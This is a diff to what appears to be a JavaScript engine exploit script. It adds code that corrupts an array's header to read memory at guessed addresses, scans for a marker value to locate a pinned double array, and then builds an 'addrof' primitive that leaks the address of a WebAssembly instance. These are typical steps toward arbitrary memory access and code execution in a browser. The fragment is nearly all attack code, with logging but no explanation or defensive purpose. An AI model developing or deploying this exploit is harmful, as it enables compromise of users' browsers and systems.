@@ -70,6 +70,35 @@ if(Array.isArray(m)){
 
     pinnedDoubles[0]=10.125;
     log("@1100011_m0: "+at1100);
+
+    // Now scan for pinnedDoubles: write marker, try addresses
+    pinnedDoubles[0]=i2f(0xCAFE1234DEAD5678n);
+    let pdAddr=0n;
+    const scanned=[];
+    for(const a of [0x1100011n,0x1120011n,0x1140011n,0x1160011n,0x1180011n,0x11a0011n,0x11c0011n,0x1200011n]){
+      m[headerIdx]=i2f((BigInt(MAXS)<<32n)|a);
+      try{
+        const v=f2i(m[0]);
+        if(v===0xCAFE1234DEAD5678n){pdAddr=a;scanned.push(a.toString(16)+"=HIT");break;}
+        scanned.push(a.toString(16)+"="+Number(v&0xffn).toString(16));
+      }catch(e){scanned.push(a.toString(16)+"=E");break;}
+    }
+    m[headerIdx]=i2f(origVal);
+    pinnedDoubles[0]=10.125;
+    log("PD_SCAN: "+scanned.join(","));
+
+    if(pdAddr>0n){
+      log("PD@"+pdAddr.toString(16));
+      // ADDROF
+      m[headerIdx]=i2f((BigInt(MAXS)<<32n)|pdAddr);
+      pinnedDoubles[0]=wasmI;
+      const raw=f2i(m[0]);
+      pinnedDoubles[0]=10.125;
+      m[headerIdx]=i2f(origVal);
+      log("WASM@"+(raw&0xffffffffn).toString(16));
+      if((raw&0xffffffffn)>0x1000n)log("ADDROF_OK");
+    }
+
     log("W: "+wasmI.exports.f());
   }else{
     log("HDR_NOT_FOUND");
